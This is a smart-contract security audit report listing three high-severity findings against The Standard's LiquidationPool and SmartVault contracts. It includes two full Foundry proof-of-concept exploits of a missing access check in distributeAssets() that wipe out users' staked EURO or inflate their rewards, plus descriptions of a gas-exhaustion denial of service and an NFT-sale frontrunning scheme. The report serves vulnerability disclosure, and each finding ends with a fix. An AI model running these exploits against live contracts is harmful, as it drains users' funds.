# [The Standard Report](https://www.codehawks.com/report/clql6lvyu0001mnje1xpqcuvl)

## Findings by Dimulski
| Severity | Title | 
|:--:|:---|
| [H-01](#H-01) | Missing access control in ``distributeAssets()`` allows for manipulation of rewards and EURO positions of users | 
| [H-02](#H-02) | Most of the operations in the LiquidationPool can be bricked by triggering OOG (out of gas) by creating sufficiently large number of pendingStakes | 
| [H-03](#H-03) | Malicious users can honeypot other users by minting all the ``EURO`` tokens that the vault's ``collateralRate`` allows right before sale | 
 



## <a id='H-01'></a>[H-01] Missing access control in ``distributeAssets()`` allows for manipulation of rewards and EURO positions of users            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L205-L241

## Summary
A malicious user can wipe out the ``EURO`` staked by users in the ``LiquidationPool.sol`` contract, burning the ``EURO`` tokens, as well as decreasing the users ``positions``, by simply executing ``distributeAssets()`` function with arbitrary parameters. A malicious user can also front run all other stakers, first create 10 ``pendingStakes`` positions with different addresses, which after one day will become normal positions, for example with stakes of ``1000e18 TST`` and ``1000e18 EURO`` having multiple accounts with smaller positions allows the attacker to withdraw the ETH, as there have to be enough ETH in the ``LiquidationPool.sol`` contract as the ``claimRewards()`` function, only transfer the full amount of rewards back to the user. Both attacks have the same root - missing access control in ``distributeAssets()``.

NOTE: Keep in mind the attack described in this issue is completely different than [H-1: Arbitrary from passed to transferFrom (or safeTransferFrom)](https://github.com/Cyfrin/2023-12-the-standard/issues/1), which is not an actual vulnerability because the ``manager`` parameter is set when the ``LiquidationPool`` is deployed.  

## Vulnerability Details
[Gist](https://gist.github.com/AtanasDimulski/e48a4662e05503203ad83a2167fff118)

After executing the steps provided in the above gist in order to set up the tests, add the following test to ``AuditorTests.t.sol`` contract
 - Scenario 1
```solidity
        function test_DistributeAssetsMissingAccessModifierWipeOutPositions() public {
        skip(2 days);
        vm.startPrank(alice);
        vm.deal(alice, 10 ether);
        (address vault, ) = vaultManagerV5Instance.mint();
        address(vault).call{value: 10 ether}("");
        SmartVaultV3 vaultInstance = SmartVaultV3(payable(vault));
        uint256 maxMintable = vaultInstance.maxMintable();
        uint256 amountToMint = maxMintable - 200 ether;
        vaultInstance.mint(alice, amountToMint);
        TST.mint(alice, EURO.balanceOf(alice));
        TST.approve(address(liquidationPool), 1000 ether);
        EURO.approve(address(liquidationPool), 1000 ether);
        liquidationPool.increasePosition(1000 ether, 1000 ether);
        vm.stopPrank();

        vm.startPrank(bob);
        vm.deal(bob, 10 ether);
        (address vaultB, ) = vaultManagerV5Instance.mint();
        address(vaultB).call{value: 10 ether}("");
        SmartVaultV3 vaultInstanceB = SmartVaultV3(payable(vaultB));
        uint256 maxMintableB = vaultInstanceB.maxMintable();
        uint256 amountToMintB = maxMintableB - 200 ether;
        vaultInstanceB.mint(bob, amountToMintB);
        TST.mint(bob, EURO.balanceOf(bob));
        TST.approve(address(liquidationPool), 1000 ether);
        EURO.approve(address(liquidationPool), 1000 ether);
        liquidationPool.increasePosition(1000 ether, 1000 ether);
        vm.stopPrank();

        vm.startPrank(john);
        vm.deal(john, 10 ether);
        (address vaultJ, ) = vaultManagerV5Instance.mint();
        address(vaultJ).call{value: 10 ether}("");
        SmartVaultV3 vaultInstanceJ = SmartVaultV3(payable(vaultJ));
        uint256 maxMintableJ = vaultInstanceJ.maxMintable();
        uint256 amountToMintJ = maxMintableJ - 200 ether;
        vaultInstanceJ.mint(john, amountToMintJ);
        TST.mint(john, EURO.balanceOf(john));
        TST.approve(address(liquidationPool), type(uint256).max);
        EURO.approve(address(liquidationPool), 1000 ether);
        liquidationPool.increasePosition(1000 ether, 1000 ether);
        /// @dev skip 2 days and call increasePosition once more wiht a minimum deposit in order to transfrom the pending stakes to positions
        skip(2 days);
        TST.mint(john, 1);
        liquidationPool.increasePosition(1, 0);
        vm.stopPrank();

        vm.startPrank(attacker);
        console2.log("Positions before attack is performed");
        (, uint256 TSTA, uint256 EUROsA ) = liquidationPool.positions(alice);
        console2.log("Position of Alice: ", TSTA/1e18, EUROsA/1e18);
        (, uint256 TSTB, uint256 EUROsB ) = liquidationPool.positions(bob);
        console2.log("Position of Bob: ", TSTB/1e18, EUROsB/1e18);
        (, uint256 TSTJ, uint256 EUROsJ) = liquidationPool.positions(john);
        console2.log("Position of John: ", TSTJ/1e18, EUROsJ/1e18);
        console2.log("Liquidation Pool contract EURO balance: ", EURO.balanceOf(address(liquidationPool))/1e18);
        (, int256 EurUsdRate,,,) = ClEurUsd.latestRoundData(); 
        (, int256 EthUsdRate,,,) = ClEthUsd.latestRoundData(); 
        uint256 amountInETH = (2900e18 * uint256(EurUsdRate)) / uint256(EthUsdRate);
        ITokenManager.Token memory maliciousToken =ITokenManager.Token(
            bytes32(0),
            address(0),
            18,
            address(ClEthUsd),
            8
        );

        ILiquidationPoolManager.Asset memory maliciousAsset = ILiquidationPoolManager.Asset(
            maliciousToken,
            amountInETH
        );
        ILiquidationPoolManager.Asset[] memory maliciousArray = new ILiquidationPoolManager.Asset[](1);
        maliciousArray[0] = maliciousAsset;
        liquidationPool.distributeAssets(maliciousArray, 1, 1);
        console2.log("");
        console2.log("Positions after attack is performed");
        (, uint256 TSTAA, uint256 EUROsAA ) = liquidationPool.positions(alice);
        console2.log("Position of Alice: ", TSTAA/1e18, EUROsAA/1e18);
        (, uint256 TSTBA, uint256 EUROsBA ) = liquidationPool.positions(bob);
        console2.log("Position of Bob: ", TSTBA/1e18, EUROsBA/1e18);
        (, uint256 TSTJA, uint256 EUROsJA) = liquidationPool.positions(john);
        console2.log("Position of John: ", TSTJA/1e18, EUROsJA/1e18);
        console2.log("Liquidation Pool contract EURO balance: ", EURO.balanceOf(address(liquidationPool))/1e18);
        /// @notice the address and symbol of ETH, which have been faked to distribute rewards
        (bytes32 symbol, address addr, uint8 dec, address clAddr, uint8 clDec) = tokenManager.acceptedTokens(0);
        console2.log("Real ETH symbol saved in the tokenManager, and used for rewards distribution");
        console2.logBytes32(symbol);
        console2.log("The saved address of ETH in the tokenManager: ", addr);
        bytes memory johnRewards = abi.encodePacked(john, symbol);
        console2.log("John acumulated rewards in the real ETH symbol: ", liquidationPool.rewards(johnRewards));
        bytes memory johnFakeRewards = abi.encodePacked(john, bytes32(0));
        console2.log("John accumulated rewards in the fake ETH symbol: ", liquidationPool.rewards(johnFakeRewards));
        vm.stopPrank();
    }
```

```solidity
Logs:
  Positions before attack is performed
  Position of Alice:  1000 1066
  Position of Bob:  1000 1022
  Position of John:  1000 1000
  Liquidation Pool contract EURO balance:  3089

  Positions after attack is performed
  Position of Alice:  1000 100
  Position of Bob:  1000 55
  Position of John:  1000 33
  Liquidation Pool contract EURO balance:  189
  Real ETH symbol saved in the tokenManager, and used for rewards distribution
  0x4554480000000000000000000000000000000000000000000000000000000000
  The saved address of ETH in the tokenManager:  0x0000000000000000000000000000000000000000
  John acumulated rewards in the real ETH symbol:  0
  John accumulated rewards in the fake ETH symbol:  445962891551386865
```
As can be seen from the above logs, the attacker wiped out nearly all of the ``EURO`` in the contract, as well as the users positions, without providing any real rewards in return. Keep in mind that parameters can be fined tuned even more. The cost of the attack is only the gas paid by the attacker in order to execute the function call.

To run the test use: ``forge test -vvv --mt test_DistributeAssetsMissingAccessModifierWipeOutPositions``

 - Scenario 2

```solidity
        function test_DistributeAssetsMissingAccessModifierIncreaseRewards() public {
        skip(2 days);
        vm.startPrank(alice);
        vm.deal(alice, 10 ether);
        (address vault, ) = vaultManagerV5Instance.mint();
        address(vault).call{value: 10 ether}("");
        SmartVaultV3 vaultInstance = SmartVaultV3(payable(vault));
        uint256 maxMintable = vaultInstance.maxMintable();
        uint256 amountToMint = maxMintable - 200 ether;
        vaultInstance.mint(alice, amountToMint);
        TST.mint(alice, EURO.balanceOf(alice));
        TST.approve(address(liquidationPool), 1000 ether);
        EURO.approve(address(liquidationPool), 1000 ether);
        liquidationPool.increasePosition(1000 ether, 1000 ether);
        vm.stopPrank();

        vm.startPrank(bob);
        vm.deal(bob, 10 ether);
        (address vaultB, ) = vaultManagerV5Instance.mint();
        address(vaultB).call{value: 10 ether}("");
        SmartVaultV3 vaultInstanceB = SmartVaultV3(payable(vaultB));
        uint256 maxMintableB = vaultInstanceB.maxMintable();
        uint256 amountToMintB = maxMintableB - 200 ether;
        vaultInstanceB.mint(bob, amountToMintB);
        TST.mint(bob, EURO.balanceOf(bob));
        TST.approve(address(liquidationPool), 1000 ether);
        EURO.approve(address(liquidationPool), 1000 ether);
        liquidationPool.increasePosition(1000 ether, 1000 ether);
        vm.stopPrank();

        vm.startPrank(john);
        vm.deal(john, 10 ether);
        (address vaultJ, ) = vaultManagerV5Instance.mint();
        address(vaultJ).call{value: 10 ether}("");
        SmartVaultV3 vaultInstanceJ = SmartVaultV3(payable(vaultJ));
        uint256 maxMintableJ = vaultInstanceJ.maxMintable();
        uint256 amountToMintJ = maxMintableJ - 200 ether;
        vaultInstanceJ.mint(john, amountToMintJ);
        TST.mint(john, EURO.balanceOf(john));
        TST.approve(address(liquidationPool), type(uint256).max);
        EURO.approve(address(liquidationPool), 1000 ether);
        liquidationPool.increasePosition(1000 ether, 1000 ether);
        /// @dev skip 2 days and call increasePosition once more wiht a minimum deposit in order to transfrom the pending stakes to positions
        skip(2 days);
        TST.mint(john, 1);
        liquidationPool.increasePosition(1, 0);
        vm.stopPrank();

        vm.startPrank(attacker);
        console2.log("Positions before attack is performed");
        (, uint256 TSTA, uint256 EUROsA ) = liquidationPool.positions(alice);
        console2.log("Position of Alice: ", TSTA/1e18, EUROsA/1e18);
        (, uint256 TSTB, uint256 EUROsB ) = liquidationPool.positions(bob);
        console2.log("Position of Bob: ", TSTB/1e18, EUROsB/1e18);
        (, uint256 TSTJ, uint256 EUROsJ) = liquidationPool.positions(john);
        console2.log("Position of John: ", TSTJ/1e18, EUROsJ/1e18);
        console2.log("Liquidation Pool contract EURO balance: ", EURO.balanceOf(address(liquidationPool))/1e18);
        (, int256 EurUsdRate,,,) = ClEurUsd.latestRoundData(); 
        (, int256 EthUsdRate,,,) = ClEthUsd.latestRoundData(); 
        uint256 amountInETH = (2900e18 * uint256(EurUsdRate)) / uint256(EthUsdRate);
        console2.log("The amountInETH that we want to distribute: ", amountInETH);
        ITokenManager.Token memory maliciousToken =ITokenManager.Token(
            ethBytes32,
            address(0),
            18,
            address(ClEthUsd),
            8
        );

        ILiquidationPoolManager.Asset memory maliciousAsset = ILiquidationPoolManager.Asset(
            maliciousToken,
            amountInETH
        );
        ILiquidationPoolManager.Asset[] memory maliciousArray = new ILiquidationPoolManager.Asset[](1);
        maliciousArray[0] = maliciousAsset;
        /// @notice we set the hundred_pc parameter to 0 so costInEuros is always 0
        /// @notice due to some roudnign down we have to supply some minimal amount of ETH as well
        vm.deal(attacker, 100);
        liquidationPool.distributeAssets{value: 100}(maliciousArray, 1, 0);
        console2.log("");
        console2.log("Positions after attack is performed");
        (, uint256 TSTAA, uint256 EUROsAA ) = liquidationPool.positions(alice);
        console2.log("Position of Alice: ", TSTAA/1e18, EUROsAA/1e18);
        (, uint256 TSTBA, uint256 EUROsBA ) = liquidationPool.positions(bob);
        console2.log("Position of Bob: ", TSTBA/1e18, EUROsBA/1e18);
        (, uint256 TSTJA, uint256 EUROsJA) = liquidationPool.positions(john);
        console2.log("Position of John: ", TSTJA/1e18, EUROsJA/1e18);
        console2.log("Liquidation Pool contract EURO balance: ", EURO.balanceOf(address(liquidationPool))/1e18);
        /// @notice the address and symbol of ETH, which have been faked to distribute rewards
        (bytes32 symbol, address addr, uint8 dec, address clAddr, uint8 clDec) = tokenManager.acceptedTokens(0);
        console2.log("");
        bytes memory aliceRewards = abi.encodePacked(alice, symbol);
        console2.log("Alice acumulated rewards in the real ETH symbol: ", liquidationPool.rewards(aliceRewards));
        bytes memory bobRewards = abi.encodePacked(bob, symbol);
        console2.log("Bob acumulated rewards in the real ETH symbol: ", liquidationPool.rewards(bobRewards));
        bytes memory johnRewards = abi.encodePacked(john, symbol);
        console2.log("John acumulated rewards in the real ETH symbol: ", liquidationPool.rewards(johnRewards));
        vm.stopPrank();
    }
```

```solidity
Logs:
  Positions before attack is performed
  Position of Alice:  1000 1066
  Position of Bob:  1000 1022
  Position of John:  1000 1000
  Liquidation Pool contract EURO balance:  3089
  The amountInETH that we want to distribute:  1337888674654160597

  Positions after attack is performed
  Position of Alice:  1000 1066
  Position of Bob:  1000 1022
  Position of John:  1000 1000
  Liquidation Pool contract EURO balance:  3089

  Alice acumulated rewards in the real ETH symbol:  445962891551386865
  Bob acumulated rewards in the real ETH symbol:  445962891551386865
  John acumulated rewards in the real ETH symbol:  445962891551386865
```

To run the test use: ``forge test -vvv --mt test_DistributeAssetsMissingAccessModifierIncreaseRewards``

## Impact
A malicious user can wipe out the ``EURO`` staked by users in the contract, burning the ``EURO`` tokens, as well as decreasing the users ``positions``.  Effectively wiping out users  ``EURO`` holdings. A malicious user can also front run all other staker accounts, and increase rewards for them, doing so in the beggining when there are not much other non-malicious stakers is easier and more profitable, but the attack can be performed multiple times, as the only cost is the gas and a very small amount of ``ETH`` that have to be paid, because of some rounding down errors. Effectively stealing rewards from non malicious stakers, that will stake later on, or when withdrawing the rewards, there won't be enough ``ETH`` in the protocol so all users can withdraw their rewards. Both attacks are detrimental for the protocol.

## Tools Used
Manual Review & Foundry

## Recommendations
Add an access control to ``distributeAssets()`` function which allows only the ``LiquidationPoolManager.sol`` contract to call it

## <a id='H-02'></a>H-02. Most of the operations in the LiquidationPool can be bricked by triggering OOG (out of gas) by creating sufficiently large number of pendingStakes            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L134-L142

## Summary
In ``LiquidationPool.sol`` we have the following function which allows users to first create a pending stake and later on that pending stake is transformed into a position 
```solidity
function increasePosition(uint256 _tstVal, uint256 _eurosVal) external {
        require(_tstVal > 0 || _eurosVal > 0);
        consolidatePendingStakes();
        ILiquidationPoolManager(manager).distributeFees();
        if (_tstVal > 0) IERC20(TST).safeTransferFrom(msg.sender, address(this), _tstVal);
        if (_eurosVal > 0) IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _eurosVal);
        pendingStakes.push(PendingStake(msg.sender, block.timestamp, _tstVal, _eurosVal));
        addUniqueHolder(msg.sender);
    }
```
The ``EURO`` token has 18 decimals, and the ``increasePostion()`` function allows us to deposit ``1 WEI``. A malicious user can create hundreds of thousands of  pending stake positions, for les than ``1 EURO`` and gas costs. And when in turn 
```solidity
function consolidatePendingStakes() private {
        uint256 deadline = block.timestamp - 1 days;
        for (int256 i = 0; uint256(i) < pendingStakes.length; i++) {
            PendingStake memory _stake = pendingStakes[uint256(i)];
            if (_stake.createdAt < deadline) {
                positions[_stake.holder].holder = _stake.holder;
                positions[_stake.holder].TST += _stake.TST;
                positions[_stake.holder].EUROs += _stake.EUROs;
                deletePendingStake(uint256(i));
                // pause iterating on loop because there has been a deletion. "next" item has same index
                i--;
            }
        }
    }
```
is called in order to transform the pending stakes into positions, this function ends up running a for loop over an unbounded array. This array can be made to be sufficiently large to exceed the block gas limit and cause out-of-gas errors and stop the processing of any rewards and assets to the non malicious stakers in the contract.

## Impact
This in turns makes the whole contract obsolete as the only function that could be called would be the ``claimRewards()``, but it could only withdraw rewards that were accrued prior to the malicious user stuffing the pendingStakes array with very small positions. 
## Tools Used
Manual review

## Recommendations
Consider setting a minimum value that user needs to deposit in order to call ``increasePosition()`` something of the sort of ``100e18``.


## <a id='H-03'></a>H-03. Malicious users can honeypot other users by minting all the ``EURO`` tokens that the vault's ``collateralRate`` allows right before sale            

## Summary
Each smart vault is represented by an NFT that is owned inittialy by the user who minted it by calling  the ```mint()``` function in ``SmartVaultManagerV5.sol`` contract:
```solidity
function mint() external returns (address vault, uint256 tokenId) {
        tokenId = lastToken + 1;
        _safeMint(msg.sender, tokenId);
        lastToken = tokenId;
        vault = ISmartVaultDeployer(smartVaultDeployer).deploy(address(this), msg.sender, euros);
        smartVaultIndex.addVaultAddress(tokenId, payable(vault));
        IEUROs(euros).grantRole(IEUROs(euros).MINTER_ROLE(), vault);
        IEUROs(euros).grantRole(IEUROs(euros).BURNER_ROLE(), vault);
        emit VaultDeployed(vault, msg.sender, euros, tokenId);
    }
```

As per the whitepaper: ``Vault NFT: A cutting-edge NFT representing the key attached to the Smart Vault. This NFT
allows users to sell their Smart Vault collateral and debt on OpenSea or other reputable NFT
marketplaces. The NFT's ownership grants control over the Smart Vault.
`` If the NFT is put for sale and has an amount of ``EURO`` that can be minted, without the buyer having to provide additional collateral a malicious user can front run the buyer transaction to buy the NFT and mint all the ``EURO`` that the ``collateralRate`` of the vault allows, and still receive the price paid by the buyer for the NFT.

## Vulnerability Details
If for example the smart vault is overcollateralized and the owner can still mint ``1000 EUROs`` and he has put the NFT for sale  for ``$800`` he can front run the buy transaction from the buyer and mint the ``1000 EUROs``, and still receive the ``$800`` paid by the pair for the NFT.

1. User A owns Smart Vault 1
2. Smart Vault 1 has enough collateral to mint ``1000 EUROs``
3. User A lists Smart Vault 1 for ``$800``
4. User B buys Smart Vault 1
5. User A sees the transaction in the mempool and quickly front runs it in order to mint ``1000 EUROs``
6. User A mints additional ``1000 EUROs``  and User B now has a vault that can't mint any ``EUROs`` without additional collateral being provided

## Impact
Malicious users can honeypot other users

## Tools Used
Manual review

## Recommendations
Consider implementing a mechanism where the owner of the vault is required to pause all interactions if he puts the vault represented by an NFT for sale.
		


